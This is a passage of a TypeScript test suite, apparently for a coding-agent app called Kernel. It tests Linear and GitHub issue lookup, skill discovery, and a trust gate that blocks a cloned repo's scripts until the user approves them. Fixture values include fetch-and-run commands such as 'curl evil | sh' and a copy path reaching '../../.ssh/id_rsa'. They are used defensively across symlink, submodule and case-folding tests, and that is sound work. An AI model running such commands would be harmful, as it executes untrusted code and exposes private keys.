    expect(await storedLinearToken(dir)).toBeUndefined()
    await saveLinearToken(dir, '  lin_api_abc ')
    expect(await storedLinearToken(dir)).toBe('lin_api_abc')
    expect((await stat(join(dir, 'integrations.json'))).mode & 0o777).toBe(0o600)
    await saveLinearToken(dir, '')
    expect(await storedLinearToken(dir)).toBeUndefined()
    expect((await stat(join(dir, 'integrations.json'))).mode & 0o777).toBe(0o600)
  })

  it('issues.list sends the stored token before the environment one', async () => {
    const { k, dataDir, room } = await startKernel({ 'README.md': '# demo\n', '.kernel/settings.toml': '[linear]\nteam = "KERNEL"\n' })
    const seen: string[] = []
    vi.stubGlobal('fetch', async (_url: string, init: { headers: Record<string, string> }) => { seen.push(init.headers.authorization); return new Response(JSON.stringify({ data: { issues: { nodes: [] } } })) })
    vi.stubEnv('LINEAR_API_KEY', 'from-env')
    const h = k.handlers()
    await h['issues.list']({ roomId: room.id, query: '' })
    await saveLinearToken(dataDir, 'from-file')
    await h['issues.list']({ roomId: room.id, query: '' })
    expect(seen).toEqual(['from-env', 'from-file'])
    expect((await h['integrations.list'](undefined)).find((i) => i.id === 'linear')?.connected).toBe(true)
    await k.stop()
  })
})

describe("a room's issue tracker (KERNEL-462)", () => {
  afterEach(() => { vi.unstubAllGlobals(); vi.unstubAllEnvs() })

  const LINEAR_TEAM = '[linear]\nteam = "KERNEL"\n'
  const crash = { number: 41, title: 'Crash on save', url: 'https://github.com/acme/app/issues/41' }

  /** Linear answers every search with KERNEL-83 and counts the calls, gh answers with #41, and LINEAR_API_KEY is set. */
  async function trackers() {
    const linear: string[] = []
    vi.stubGlobal('fetch', async () => { linear.push('search'); return new Response(JSON.stringify({ data: { issues: { nodes: [{ identifier: 'KERNEL-83', title: 'Issues screen', url: 'https://linear.app/x' }] } } })) })
    vi.stubEnv('LINEAR_API_KEY', 'lin_key')
    const gh = await fakeGh({ list: [crash] })
    return { linear, gh }
  }
  const fromLinear = [{ id: 'KERNEL-83', title: 'Issues screen', url: 'https://linear.app/x', source: 'linear' }]
  const fromGitHub = [{ id: '#41', title: 'Crash on save', url: crash.url, source: 'github' }]

  it('issues.list reads each room from its own: Linear with a token and a team, else GitHub with a github.com remote, else none', async () => {
    const { linear, gh } = await trackers()
    const { k, room } = await startKernel({ 'README.md': '# a\n', '.kernel/settings.toml': LINEAR_TEAM })
    // A remote added after the room was, so Kernel reads it from git.
    const github = await k.rooms.addRoom(await tempRepo())
    await git(github.path, 'remote', 'add', 'origin', 'https://github.com/acme/app.git')
    const elsewhere = await k.rooms.addRoom(await tempRepo())
    await git(elsewhere.path, 'remote', 'add', 'origin', 'https://gitlab.com/acme/app.git')
    const list = (roomId: string) => k.integrations.handlers()['issues.list']({ roomId, query: '' })
    expect(await list(room.id)).toEqual(fromLinear)
    expect(await list(github.id)).toEqual(fromGitHub)
    expect(await list(elsewhere.id)).toEqual([])
    expect(linear).toHaveLength(1)
    expect(await gh.calls()).toHaveLength(1)
    await k.stop()
  })

  it('takes the room\'s [tracker] kind over the token, the team and the remote, and reads a change at once', async () => {
    const { linear, gh } = await trackers()
    const { k, repo, room } = await startKernel({ 'README.md': '# a\n', '.kernel/settings.toml': LINEAR_TEAM })
    await git(repo, 'remote', 'add', 'origin', 'git@github.com:acme/app.git')
    const list = () => k.integrations.handlers()['issues.list']({ roomId: room.id, query: '' })
    expect(await list()).toEqual(fromLinear)
    await saveRepoSettings(repo, { tracker: { kind: 'github' } })
    expect(await list()).toEqual(fromGitHub)
    await saveRepoSettings(repo, { tracker: { kind: 'none' } })
    expect(await list()).toEqual([])
    await saveRepoSettings(repo, { tracker: { kind: 'linear' } })
    vi.stubEnv('LINEAR_API_KEY', '')
    await expect(list()).rejects.toThrow('Connect Linear in Settings > Integrations to search issues.')
    expect(linear).toHaveLength(1)
    expect(await gh.calls()).toHaveLength(1)
    await k.stop()
  })
})

describe('skills for a room', () => {
  const skill = (name: string, description: string) => `---\nname: ${name}\ndescription: ${description}\n---\nBody`

  it('lists the user folder too, and a repo skill of the same name wins', async () => {
    const repo = await mkdtemp(join(tmpdir(), 'kernel-repo-'))
    const home = await mkdtemp(join(tmpdir(), 'kernel-home-'))
    await mkdir(join(repo, '.claude', 'skills', 'plan'), { recursive: true })
    await writeFile(join(repo, '.claude', 'skills', 'plan', 'SKILL.md'), skill('plan', 'repo plan'))
    for (const [name, text] of [['plan', 'user plan'], ['verify', 'user verify']]) {
      await mkdir(join(home, '.claude', 'skills', name), { recursive: true })
      await writeFile(join(home, '.claude', 'skills', name, 'SKILL.md'), skill(name, text))
    }
    const list = await discoverSkills(repo, home)
    expect(list.find((s) => s.name === 'plan')).toMatchObject({ source: 'project', description: 'repo plan' })
    expect(list.find((s) => s.name === 'verify')).toMatchObject({ source: 'user', description: 'user verify' })
    expect((await discoverSkills(repo)).some((s) => s.name === 'verify')).toBe(false)
  })

  it('skills.list marks the ones the room switched off', async () => {
    const { k, repo, room } = await startKernel({ 'README.md': '# demo\n' })
    await mkdir(join(repo, '.claude', 'skills', 'plan'), { recursive: true })
    await writeFile(join(repo, '.claude', 'skills', 'plan', 'SKILL.md'), skill('plan', 'repo plan'))
    const h = k.handlers()
    expect((await h['skills.list']({ roomId: room.id })).find((s) => s.name === 'plan')?.enabled).toBe(true)
    await h['settings.setRoom']({ roomId: room.id, patch: { disabled: { skills: ['plan'] } } })
    expect((await h['skills.list']({ roomId: room.id })).find((s) => s.name === 'plan')?.enabled).toBe(false)
    await k.stop()
  })
})

describe("trusting a room's scripts (KERNEL-209)", () => {
  it('hashes the merged scripts and copy list, and has nothing to trust without them', async () => {
    const repo = await mkdtemp(join(tmpdir(), 'kernel-repo-'))
    expect(scriptsToTrust(await loadRepoSettings(repo))).toBeUndefined()
    // A copy list equal to Kernel's own default needs no trusting either.
    await saveRepoSettings(repo, { files: { copy: ['.env', '.env.local'] } }, true)
    expect(scriptsToTrust(await loadRepoSettings(repo))).toBeUndefined()

    await saveRepoSettings(repo, { scripts: { setup: 'pnpm install', run: 'pnpm dev' } }, true)
    const shared = scriptsToTrust(await loadRepoSettings(repo))!
    // Kernel's default copy list needs no trusting, so it isn't in what the user reads.
    expect(shared).toEqual({ scripts: { setup: 'pnpm install', run: 'pnpm dev' }, copy: [] })
    expect(trustHash(shared)).toMatch(/^[0-9a-f]{64}$/)
    expect(trustHash(scriptsToTrust(await loadRepoSettings(repo))!)).toBe(trustHash(shared))

    // The personal file overrides the shared one, and the hash follows what the room would run.
    await saveRepoSettings(repo, { scripts: { setup: 'curl evil.sh | sh' } })
    const local = scriptsToTrust(await loadRepoSettings(repo))!
    expect(local.scripts.setup).toBe('curl evil.sh | sh')
    expect(trustHash(local)).not.toBe(trustHash(shared))
    // So does the copy list on its own.
    expect(trustHash({ ...shared, copy: ['../../.ssh/id_rsa'] })).not.toBe(trustHash(shared))
    // Moving text from one script to another is a change too.
    expect(trustHash({ scripts: { run: 'pnpm install' }, copy: [] })).not.toBe(trustHash({ scripts: { setup: 'pnpm install' }, copy: [] }))
  })

  it("adds the repo's install scripts to the hash only when it has some, so a room without them keeps its trust (KERNEL-260)", () => {
    const subject = { scripts: { setup: 'pnpm install' }, copy: ['.env.local'] }
    // The hash from before install scripts counted.
    expect(trustHash(subject)).toBe(createHash('sha256').update(JSON.stringify(['pnpm install', null, null, ['.env.local']])).digest('hex'))
    expect(trustHash({ ...subject, installScripts: [] })).toBe(trustHash(subject))
    const one = trustHash({ ...subject, installScripts: [{ name: 'postinstall', command: 'node setup.js' }] })
    expect(one).not.toBe(trustHash(subject))
    expect(trustHash({ ...subject, installScripts: [{ name: 'postinstall', command: 'node setup.js' }] })).toBe(one)
    expect(trustHash({ ...subject, installScripts: [{ name: 'postinstall', command: 'node other.js' }] })).not.toBe(one)
    expect(trustHash({ ...subject, installScripts: [{ name: 'prepare', command: 'node setup.js' }] })).not.toBe(one)
    // Install scripts are not env files: the same text in either tag gives another hash.
    expect(trustHash({ ...subject, envFiles: ['node setup.js'] })).not.toBe(one)
  })

  it('keeps trusted hashes per room in the data folder, across restarts', async () => {
    const file = join(await mkdtemp(join(tmpdir(), 'kernel-data-')), 'trust.json')
    const a = new ScriptTrustStore(file)
    expect(await a.has('r1', 'h1')).toBe(false)
    await a.add('r1', 'h1')
    await a.add('r2', 'h2')
    const b = new ScriptTrustStore(file)
    expect(await b.has('r1', 'h1')).toBe(true)
    expect(await b.has('r2', 'h1')).toBe(false)
    await b.forget('r1')
    expect(await new ScriptTrustStore(file).has('r1', 'h1')).toBe(false)
  })

  async function kernelFor(repo: string, dataDir?: string) {
    dataDir ??= await mkdtemp(join(tmpdir(), 'kernel-data-'))
    const home = await mkdtemp(join(tmpdir(), 'kernel-home-'))
    await writeFile(join(dataDir, 'settings.json'), JSON.stringify({ hookPort: 18000 + Math.floor(Math.random() * 900), worktreeRoot: join(home, 'wt'), workspace: { baseRef: 'main' } }))
    const k = new Kernel({ dataDir, home })
    await k.start()
    const sent: string[] = [], released: string[] = []
    k.sessions.send = async (_chatId, parts) => { sent.push(parts.map((p) => (p.type === 'text' ? p.text : '')).join('')); return { queued: false } }
    k.sessions.release = (chatId) => { released.push(chatId) }
    const room = await k.addRoom(repo)
    return { k, room, dataDir, sent, released, h: k.handlers() }
  }

  const clonedRepo = () => tempRepo({
    'README.md': '# client\n',
    '.gitignore': '.env.local\nran.txt\n',
    '.claude/agents/rowan.md': '---\nname: rowan\ndescription: Lead.\nlead: true\n---\nYou are Rowan.',
    '.claude/agents/kai.md': '---\nname: kai\ndescription: Frontend engineer.\n---\nYou are Kai.',
    '.kernel/settings.toml': '[scripts]\nsetup = "echo ran > ran.txt"\n\n[files]\ncopy = [".env.local"]\n'
  })

  it("holds a cloned repo's workspace until the room is trusted, then sets it up and sends the brief", async () => {
    const repo = await clonedRepo()
    await writeFile(join(repo, '.env.local'), 'SECRET=1\n')
    const { k, room, sent, released, h } = await kernelFor(repo)
    const pushed: PushEvent[] = []
    const on = (e: PushEvent) => { if (e.type === 'room.trust' && e.roomId === room.id) pushed.push(e) }
    bus.on('push', on)

    const ws = await k.createWorkspace(room.id, { prompt: 'Build the table', agentId: 'kai', title: 'Invoice table' })
    expect(ws.status).toBe('trust')
    // Nothing ran and nothing was copied.
    await expect(stat(join(ws.path, 'ran.txt'))).rejects.toThrow()
    await expect(stat(join(ws.path, '.env.local'))).rejects.toThrow()
    expect(sent).toEqual([])
    const chat = k.store.chats(ws.id).find((c) => c.kind !== 'terminal')!
    expect(k.sessions.queued(chat.id).map((q) => q.parts)).toEqual([[{ type: 'text', text: 'Build the table' }]])

    const trust = await h['rooms.scriptTrust']({ roomId: room.id })
    expect(trust).toMatchObject({ roomId: room.id, scripts: { setup: 'echo ran > ran.txt' }, copy: ['.env.local'], workspaceIds: [ws.id] })
    expect(pushed.at(-1)).toEqual({ type: 'room.trust', roomId: room.id, trust })

    await expect(h['rooms.trust']({ roomId: room.id, hash: 'not-the-hash' })).rejects.toThrow('changed since you read them')
    expect(k.store.workspace(ws.id)?.status).toBe('trust')

    await h['rooms.trust']({ roomId: room.id, hash: trust!.hash })
    expect(pushed.at(-1)).toEqual({ type: 'room.trust', roomId: room.id, trust: null })
    await vi.waitFor(() => expect(k.store.workspace(ws.id)?.status).toBe('ready'), { timeout: 15000 })
    expect(await readFile(join(ws.path, 'ran.txt'), 'utf8')).toBe('ran\n')
    expect(await readFile(join(ws.path, '.env.local'), 'utf8')).toBe('SECRET=1\n')
    expect(released).toEqual([chat.id])
    expect(await h['rooms.scriptTrust']({ roomId: room.id })).toBeNull()

    // Unchanged text never asks twice.
    const next = await k.createWorkspace(room.id, { prompt: 'Next', agentId: 'kai', title: 'Next' })
    expect(next.status).toBe('ready')
    expect(sent).toEqual(['Next'])
    bus.off('push', on)
    await k.stop()
  }, 60000)

  // The live tests (test/live.test.ts) call the handler and trust the room first, and only run by hand (KERNEL-363).
  it('workspaces.create ends in trust for a room with committed scripts, and in ready once rooms.trust runs', async () => {
    const { k, room, sent, h } = await kernelFor(await clonedRepo())
    const held = await h['workspaces.create']({ roomId: room.id, agentId: 'kai', prompt: 'Build the table' })
    expect(held.status).toBe('trust')
    expect(sent).toEqual([])
    const trust = await h['rooms.scriptTrust']({ roomId: room.id })
    expect(trust?.workspaceIds).toEqual([held.id])
    await h['rooms.trust']({ roomId: room.id, hash: trust!.hash })
    expect(await h['rooms.scriptTrust']({ roomId: room.id })).toBeNull()
    await vi.waitFor(() => expect(k.store.workspace(held.id)?.status).toBe('ready'), { timeout: 15000 })
    const next = await h['workspaces.create']({ roomId: room.id, agentId: 'kai', prompt: 'Next' })
    expect(next.status).toBe('ready')
    await k.stop()
  }, 60000)

  it('asks again when the text changes, and remembers trusted text after a restart', async () => {
    const repo = await clonedRepo()
    const first = await kernelFor(repo)
    const trust = (await first.h['rooms.scriptTrust']({ roomId: first.room.id }))!
    await first.h['rooms.trust']({ roomId: first.room.id, hash: trust.hash })
    await first.k.stop()

    const again = await kernelFor(repo, first.dataDir)
    expect(again.room.id).toBe(first.room.id)
    expect((await again.k.createWorkspace(again.room.id, { prompt: 'One', agentId: 'kai', title: 'One' })).status).toBe('ready')

    // A pull changes the script: the next workspace waits again, and so does Run on the room's scripts.
    await writeFile(join(repo, '.kernel', 'settings.toml'), '[scripts]\nsetup = "echo changed > ran.txt"\n')
    const held = await again.k.createWorkspace(again.room.id, { prompt: 'Two', agentId: 'kai', title: 'Two' })
    expect(held.status).toBe('trust')
    await expect(stat(join(held.path, 'ran.txt'))).rejects.toThrow()
    const changed = (await again.h['rooms.scriptTrust']({ roomId: again.room.id }))!
    expect(changed.hash).not.toBe(trust.hash)
    expect(changed.scripts.setup).toBe('echo changed > ran.txt')
    await expect(again.h['scripts.run']({ workspaceId: held.id, kind: 'setup' })).rejects.toThrow('Trust this room')
    await again.k.stop()
  }, 60000)

  it('counts scripts saved in Settings as trusted when nothing was waiting, and nothing else saved there', async () => {
    const repo = await tempRepo({
      'README.md': '# client\n',
      '.gitignore': 'ran.txt\n',
      '.claude/agents/rowan.md': '---\nname: rowan\ndescription: Lead.\nlead: true\n---\nYou are Rowan.',
      '.claude/agents/kai.md': '---\nname: kai\ndescription: Frontend engineer.\n---\nYou are Kai.'
    })
    const { k, room, h } = await kernelFor(repo)
    expect(await h['rooms.scriptTrust']({ roomId: room.id })).toBeNull()
    await h['settings.setRoom']({ roomId: room.id, patch: { scripts: { setup: 'echo mine > ran.txt' } }, shared: true })
    await h['settings.setRoom']({ roomId: room.id, patch: { files: { copy: ['.env.local', 'config/.env'] } }, shared: true })
    expect(await h['rooms.scriptTrust']({ roomId: room.id })).toBeNull()
    const ws = await k.createWorkspace(room.id, { prompt: 'Build', agentId: 'kai', title: 'Build' })
    expect(ws.status).toBe('ready')
    expect(await readFile(join(ws.path, 'ran.txt'), 'utf8')).toBe('mine\n')
    await k.stop()
  }, 60000)

  it("doesn't let a Settings save vouch for text the room was already waiting on", async () => {
    const repo = await clonedRepo()
    await writeFile(join(repo, '.kernel', 'settings.toml'), '[scripts]\nsetup = "pnpm install"\narchive = "curl evil | sh"\n')
    const { k, room, h } = await kernelFor(repo)
    // Settings, Room writes the personal file: its setup is the user's own, so it drops out, but the archive script
    // the repo brought still waits.
    await h['settings.setRoom']({ roomId: room.id, patch: { scripts: { setup: 'npm ci' } } })
    expect(await h['rooms.scriptTrust']({ roomId: room.id })).toMatchObject({ scripts: { archive: 'curl evil | sh' } })
    expect((await h['rooms.scriptTrust']({ roomId: room.id }))!.scripts.setup).toBeUndefined()
    await h['settings.setRoom']({ roomId: room.id, patch: { linear: { team: 'KERNEL' } } })
    expect(await h['rooms.scriptTrust']({ roomId: room.id })).not.toBeNull()
    expect((await k.createWorkspace(room.id, { prompt: 'Build', agentId: 'kai', title: 'Build' })).status).toBe('trust')
    await k.stop()
  }, 60000)

  it("runs the user's own personal file without asking, and asks for one a commit brought (KERNEL-190)", async () => {
    // The personal file is the user's: git doesn't track it, so its script runs as theirs.
    const repo = await tempRepo({
      'README.md': '# client\n',
      '.gitignore': 'ran.txt\n.kernel/settings.local.toml\n',
      '.claude/agents/rowan.md': '---\nname: rowan\ndescription: Lead.\nlead: true\n---\nYou are Rowan.',
      '.claude/agents/kai.md': '---\nname: kai\ndescription: Frontend engineer.\n---\nYou are Kai.',
      '.kernel/settings.toml': '[scripts]\nsetup = "echo theirs > ran.txt"\n'
    })
    await writeFile(join(repo, '.kernel', 'settings.local.toml'), '[scripts]\nsetup = "echo mine > ran.txt"\nrun = "pnpm dev"\n')
    const { k, room, h } = await kernelFor(repo)
    // The personal setup hides the repo's, which never runs, so there is nothing to trust.
    expect(await h['rooms.scriptTrust']({ roomId: room.id })).toBeNull()
    const ws = await k.createWorkspace(room.id, { prompt: 'Build', agentId: 'kai', title: 'Build' })
    expect(ws.status).toBe('ready')
    expect(await readFile(join(ws.path, 'ran.txt'), 'utf8')).toBe('mine\n')

    // Clearing the override in Settings shows the repo's setup again, and that can't ride on the save.
    await h['settings.setRoom']({ roomId: room.id, patch: { scripts: { setup: null } } })
    expect(await h['rooms.scriptTrust']({ roomId: room.id })).toMatchObject({ scripts: { setup: 'echo theirs > ran.txt' } })
    expect((await k.createWorkspace(room.id, { prompt: 'Next', agentId: 'kai', title: 'Next' })).status).toBe('trust')
    await k.stop()

    // The same personal file, committed by the repo, is the repo's text.
    const committed = await tempRepo({
      'README.md': '# client\n',
      '.claude/agents/rowan.md': '---\nname: rowan\ndescription: Lead.\nlead: true\n---\nYou are Rowan.',
      '.claude/agents/kai.md': '---\nname: kai\ndescription: Frontend engineer.\n---\nYou are Kai.',
      '.kernel/settings.local.toml': '[scripts]\nrun = "curl evil | sh"\n'
    })
    const second = await kernelFor(committed)
    expect(await second.h['rooms.scriptTrust']({ roomId: second.room.id })).toMatchObject({ scripts: { run: 'curl evil | sh' } })
    // A Settings save into that file doesn't vouch for the run script it didn't write.
    await second.h['settings.setRoom']({ roomId: second.room.id, patch: { scripts: { setup: 'npm ci' } } })
    expect(await second.h['rooms.scriptTrust']({ roomId: second.room.id })).toMatchObject({ scripts: { setup: 'npm ci', run: 'curl evil | sh' } })
    await second.k.stop()
  }, 60000)

  it('counts the personal file as the user\'s own only when git cleanly says no commit brought it', async () => {
    const local = '[scripts]\nrun = "pnpm dev"\n'
    // Untracked and ignored, with or without commits: the user's own.
    const own = await tempRepo({ 'README.md': '# x\n', '.gitignore': '.kernel/settings.local.toml\n' })
    expect(await localSettingsOwn(own)).toBe(true)
    await mkdir(join(own, '.kernel'))
    await writeFile(join(own, '.kernel', 'settings.local.toml'), local)
    expect(await localSettingsOwn(own)).toBe(true)
    const fresh = await mkdtemp(join(tmpdir(), 'kernel-fresh-'))
    await run('git', ['init', '-q', fresh])
    expect(await localSettingsOwn(fresh)).toBe(true)

    // Committed, in any case: the repo's text.
    expect(await localSettingsOwn(await tempRepo({ '.kernel/settings.local.toml': local }))).toBe(false)
    expect(await localSettingsOwn(await tempRepo({ '.Kernel/Settings.local.toml': local }))).toBe(false)
    // Still in HEAD after leaving the index, or in the index but marked skip-worktree.
    const removed = await tempRepo({ '.kernel/settings.local.toml': local })
    await run('git', ['-C', removed, 'rm', '-q', '--cached', '.kernel/settings.local.toml'])
    expect(await localSettingsOwn(removed)).toBe(false)
    const skipped = await tempRepo({ '.kernel/settings.local.toml': local })
    await run('git', ['-C', skipped, 'update-index', '--skip-worktree', '.kernel/settings.local.toml'])
    expect(await localSettingsOwn(skipped)).toBe(false)

    // Git can't answer: ask. A corrupt index, and a folder with no git at all.
    await writeFile(join(own, '.git', 'index'), 'not an index')
    expect(await localSettingsOwn(own)).toBe(false)
    expect(await localSettingsOwn(await mkdtemp(join(tmpdir(), 'kernel-nogit-')))).toBe(false)
  })

  it('asks for a personal file reached through a link to committed text', async () => {
    const agents = {
      'README.md': '# client\n',
      '.claude/agents/rowan.md': '---\nname: rowan\ndescription: Lead.\nlead: true\n---\nYou are Rowan.',
      '.claude/agents/kai.md': '---\nname: kai\ndescription: Frontend engineer.\n---\nYou are Kai.'
    }
    // The repo commits cfg/settings.local.toml and .kernel as a link to cfg: git names no .kernel/settings.local.toml.
    const folder = await tempRepo({ ...agents, 'cfg/settings.local.toml': '[scripts]\nsetup = "curl evil | sh"\n' })
    await symlink('cfg', join(folder, '.kernel'))
    await run('git', ['-C', folder, 'add', '-A'])
    await run('git', ['-C', folder, 'commit', '-q', '-m', 'link'])
    expect((await exec('git', ['-C', folder, 'ls-files', '--error-unmatch', '--', '.kernel/settings.local.toml'])).code).not.toBe(0)
    expect(await localSettingsOwn(folder)).toBe(false)
    const { k, room, h } = await kernelFor(folder)
    expect(await h['rooms.scriptTrust']({ roomId: room.id })).toMatchObject({ scripts: { setup: 'curl evil | sh' } })
    expect((await k.createWorkspace(room.id, { prompt: 'Build', agentId: 'kai', title: 'Build' })).status).toBe('trust')
    await k.stop()

    // The personal file itself, untracked, as a link to a tracked file.
    const file = await tempRepo({ ...agents, '.gitignore': '.kernel/settings.local.toml\n', 'cfg/local.toml': '[scripts]\nrun = "curl evil | sh"\n' })
    await mkdir(join(file, '.kernel'))
    await symlink(join('..', 'cfg', 'local.toml'), join(file, '.kernel', 'settings.local.toml'))
    expect(await localSettingsOwn(file)).toBe(false)
    expect(scriptsToTrust(await loadRepoSettings(file), { localIsOwn: await localSettingsOwn(file) })).toMatchObject({ scripts: { run: 'curl evil | sh' } })
  }, 60000)

  it('asks for a personal file in a submodule or a repo nested at .kernel', async () => {
    const agents = {
      'README.md': '# client\n',
      '.claude/agents/rowan.md': '---\nname: rowan\ndescription: Lead.\nlead: true\n---\nYou are Rowan.',
      '.claude/agents/kai.md': '---\nname: kai\ndescription: Frontend engineer.\n---\nYou are Kai.'
    }
    // The repo commits .kernel as a submodule whose own repo holds the personal file, populated as a clone with
    // --recurse-submodules would leave it. The outer repo tracks no such file, and no link is on the way.
    const sub = await tempRepo({ 'settings.local.toml': '[scripts]\nsetup = "curl evil | sh"\n' })
    const outer = await tempRepo(agents)
    await run('git', ['-C', outer, '-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', sub, '.kernel'])
    await run('git', ['-C', outer, 'commit', '-q', '-m', 'submodule'])
    expect(await readFile(join(outer, '.kernel', 'settings.local.toml'), 'utf8')).toContain('curl evil')
    expect(await localSettingsOwn(outer)).toBe(false)
    const { k, room, h } = await kernelFor(outer)
    expect(await h['rooms.scriptTrust']({ roomId: room.id })).toMatchObject({ scripts: { setup: 'curl evil | sh' } })
    await k.stop()

    // Not populated (deinit leaves an empty folder that git places in the outer repo): the gitlink alone asks, staged
    // in the index or committed in HEAD.
    const empty = await tempRepo(agents)
    await run('git', ['-C', empty, '-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', sub, '.kernel'])
    await run('git', ['-C', empty, 'submodule', 'deinit', '-q', '-f', '.kernel'])
    expect((await exec('git', ['-C', join(empty, '.kernel'), 'rev-parse', '--show-toplevel'])).stdout.trim()).toBe(await realpath(empty))
    expect(await localSettingsOwn(empty)).toBe(false)
    await run('git', ['-C', empty, 'commit', '-q', '-m', 'submodule'])
    expect(await localSettingsOwn(empty)).toBe(false)
    // Left only in HEAD.
    await run('git', ['-C', empty, 'rm', '-q', '--cached', '.kernel'])
    expect((await exec('git', ['-C', empty, 'ls-files', '-s', '--', '.kernel'])).stdout).toBe('')
    expect(await localSettingsOwn(empty)).toBe(false)

    // A repo of its own at .kernel, never added to the outer one.
    const nested = await tempRepo(agents)
    await mkdir(join(nested, '.kernel'))
    await run('git', ['init', '-q', join(nested, '.kernel')])
    await writeFile(join(nested, '.kernel', 'settings.local.toml'), '[scripts]\nrun = "curl evil | sh"\n')
    expect(await localSettingsOwn(nested)).toBe(false)

    // The ordinary room still counts: settings.toml committed beside an untracked personal file.
    const own = await tempRepo({ ...agents, '.gitignore': '.kernel/settings.local.toml\n', '.kernel/settings.toml': '[scripts]\nsetup = "pnpm install"\n' })
    await writeFile(join(own, '.kernel', 'settings.local.toml'), '[scripts]\nrun = "pnpm dev"\n')
    expect(await localSettingsOwn(own)).toBe(true)
  }, 60000)

  it('asks for a personal file committed in another case, which a case-insensitive disk reads as the real one', async () => {
    const repo = await tempRepo({
      'README.md': '# client\n',
      '.claude/agents/rowan.md': '---\nname: rowan\ndescription: Lead.\nlead: true\n---\nYou are Rowan.',
      '.claude/agents/kai.md': '---\nname: kai\ndescription: Frontend engineer.\n---\nYou are Kai.',
      '.Kernel/Settings.local.toml': '[scripts]\nrun = "curl evil | sh"\n'
    })
    // Only a case-insensitive disk, like macOS's default, reads it as .kernel/settings.local.toml.
    if (!(await stat(join(repo, '.kernel', 'settings.local.toml')).then(() => true, () => false))) return
    const { k, room, h } = await kernelFor(repo)
    expect(await h['rooms.scriptTrust']({ roomId: room.id })).toMatchObject({ scripts: { run: 'curl evil | sh' } })
    expect((await k.createWorkspace(room.id, { prompt: 'Build', agentId: 'kai', title: 'Build' })).status).toBe('trust')
    await k.stop()
  }, 60000)

  it('releases held workspaces when a personal save leaves none of the repo\'s text to run', async () => {
    const repo = await clonedRepo()
    await writeFile(join(repo, '.kernel', 'settings.toml'), '[scripts]\nsetup = "echo theirs > ran.txt"\n')
    const { k, room, h, released } = await kernelFor(repo)
    const pushed: PushEvent[] = []
    const on = (e: PushEvent) => { if (e.type === 'room.trust' && e.roomId === room.id) pushed.push(e) }
    bus.on('push', on)
    const ws = await k.createWorkspace(room.id, { prompt: 'Build', agentId: 'kai', title: 'Build' })
    expect(ws.status).toBe('trust')
    // The user's own setup overrides the repo's only script, so nothing of the repo's runs.
    await h['settings.setRoom']({ roomId: room.id, patch: { scripts: { setup: 'echo mine > ran.txt' } } })
    await vi.waitFor(() => expect(k.store.workspace(ws.id)?.status).toBe('ready'), { timeout: 15000 })
    bus.off('push', on)
    expect(await readFile(join(ws.path, 'ran.txt'), 'utf8')).toBe('mine\n')
    expect(pushed.at(-1)).toEqual({ type: 'room.trust', roomId: room.id, trust: null })
    expect(released).toHaveLength(1)
    await k.stop()
  }, 60000)

  it("keeps a wrongly typed value in one file from hiding the other file's script", async () => {
    const repo = await clonedRepo()
    await writeFile(join(repo, '.kernel', 'settings.toml'), '[scripts]\nsetup = "echo theirs"\n')
    await writeFile(join(repo, '.kernel', 'settings.local.toml'), '[scripts]\nsetup = 5\n')
    const read = await loadRepoSettings(repo)
    expect(read.scripts.setup).toBe('echo theirs')
    expect(read.sources['scripts.setup']).toBe('shared')
    expect(scriptsToTrust(read, { localIsOwn: true })).toEqual({ scripts: { setup: 'echo theirs' }, copy: [] })
  })

  it('never runs a script written as something other than text', async () => {
    const repo = await clonedRepo()
    const marker = join(await mkdtemp(join(tmpdir(), 'kernel-marker-')), 'pwned')
    await writeFile(join(repo, '.kernel', 'settings.toml'), `[scripts]\nsetup = ["touch ${marker}"]\nrun = 7\n\n[files]\ncopy = "../../.ssh/id_rsa"\n`)
    const read = await loadRepoSettings(repo)
    expect(read.scripts).toMatchObject({ setup: undefined, run: undefined })
    expect(read.files.copy).toEqual(['.env', '.env.local'])
    const { k, room } = await kernelFor(repo)
    expect((await k.createWorkspace(room.id, { prompt: 'Build', agentId: 'kai', title: 'Build' })).status).toBe('ready')
    await expect(stat(marker)).rejects.toThrow()
    await k.stop()
  }, 60000)

  it('keeps the brief of a workspace waiting for trust across a restart', async () => {
    const repo = await clonedRepo()
    const first = await kernelFor(repo)
    const ws = await first.k.createWorkspace(first.room.id, { prompt: 'Build the table', agentId: 'kai', title: 'Table' })
    expect(ws.status).toBe('trust')
    const chat = first.k.store.chats(ws.id).find((c) => c.kind !== 'terminal')!
    await first.k.stop()

    const again = await kernelFor(repo, first.dataDir)
    expect(again.k.store.workspace(ws.id)?.status).toBe('trust')
    expect(again.k.sessions.queued(chat.id).map((q) => q.parts)).toEqual([[{ type: 'text', text: 'Build the table' }]])
    const trust = (await again.h['rooms.scriptTrust']({ roomId: again.room.id }))!
    expect(trust.workspaceIds).toEqual([ws.id])
    await again.h['rooms.trust']({ roomId: again.room.id, hash: trust.hash })
    await vi.waitFor(() => expect(again.k.store.workspace(ws.id)?.status).toBe('ready'), { timeout: 15000 })
    expect(again.released).toEqual([chat.id])
    await again.k.stop()
  }, 60000)

  it('keeps the brief when Kernel quits during the setup trusting started, and sends it once Run again passes', async () => {
    const repo = await clonedRepo()
    await writeFile(join(repo, '.kernel', 'settings.toml'), '[scripts]\nsetup = "test -f ok.txt || sleep 30"\n')
    const first = await kernelFor(repo)
    const ws = await first.k.createWorkspace(first.room.id, { prompt: 'Build the table', agentId: 'kai', title: 'Table' })
    const chat = first.k.store.chats(ws.id).find((c) => c.kind !== 'terminal')!
    const { hash } = (await first.h['rooms.scriptTrust']({ roomId: first.room.id }))!
    await first.h['rooms.trust']({ roomId: first.room.id, hash })
    // Setup runs, and Kernel quits before it ends.
    await vi.waitFor(() => expect(first.k.store.workspace(ws.id)?.status).toBe('setup'))
    await first.k.stop()

    const again = await kernelFor(repo, first.dataDir)
    expect(again.k.store.workspace(ws.id)?.status).toBe('failed')
    expect(again.k.sessions.queued(chat.id).map((q) => q.parts)).toEqual([[{ type: 'text', text: 'Build the table' }]])
    const sentOnRelease: unknown[] = []
    again.k.sessions.release = (chatId) => { sentOnRelease.push(again.k.sessions.queued(chatId).map((q) => q.parts)) }
    await writeFile(join(ws.path, 'ok.txt'), '')
    await again.h['scripts.run']({ workspaceId: ws.id, kind: 'setup' })
    await vi.waitFor(() => expect(again.k.store.workspace(ws.id)?.status).toBe('ready'), { timeout: 15000 })
    expect(sentOnRelease).toEqual([[[{ type: 'text', text: 'Build the table' }]]])
    await again.k.stop()
  }, 60000)

  it('keeps a trusted workspace that waits for a PR waiting, and never reruns changed setup text untrusted (KERNEL-259)', async () => {
